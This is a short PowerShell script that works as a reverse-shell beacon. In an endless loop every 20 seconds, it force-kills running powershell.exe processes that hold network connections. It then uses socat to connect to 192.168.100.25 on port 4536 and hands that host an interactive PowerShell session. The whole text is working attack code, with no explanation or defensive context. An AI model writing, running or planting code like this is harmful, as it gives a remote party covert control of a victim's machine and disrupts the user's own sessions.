$multilineScript = @' 

if(Get-Process -Name powershell.exe | ForEach-Object { Get-NetTCPConnection -OwningProcess $_.Id -ErrorAction SilentlyContinue } ){
	Write-Host "running, exterminating..."
	taskkill /IM powershell.exe /F
}else{
Write-Host "not running, bye bye..."	
}
powershell.exe -noexit .\socat -d -d TCP4:192.168.100.25:4536 EXEC:'powershell.exe',pipes
'@
$scriptBlock = [scriptblock]::Create($multilineScript)
while(1){

Invoke-Command -ScriptBlock $scriptBlock
Start-Sleep -Seconds 20


}


